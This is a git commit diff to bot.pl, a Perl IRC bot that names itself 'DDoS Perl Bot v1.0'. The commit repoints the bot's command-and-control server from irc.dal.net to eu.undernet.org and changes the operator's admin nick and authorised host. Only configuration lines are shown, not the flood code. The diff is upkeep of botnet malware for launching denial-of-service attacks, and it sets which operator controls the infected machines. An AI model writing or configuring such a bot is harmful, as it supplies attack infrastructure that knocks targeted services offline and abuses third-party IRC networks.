89d1cb49f4d6cf929fc8410d43a5c160ee67d16b
7amudaa <120391197+7amudaa@users.noreply.github.com>
2023-12-22 12:06:46 +0300

    Update bot.pl

--- bot.pl
+++ bot.pl
@@ -133,7 +133,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'irc.dal.net' unless $server;
+$server = 'eu.undernet.org' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
@@ -142,8 +142,8 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("moey");
-my @hostauth = ("lilmoe.store");
+my @admins = ("lilmoe");
+my @hostauth = ("lilmoe.users.undernet.org");
 my @channels = ("#moey");
  
 my $pacotes = 1;
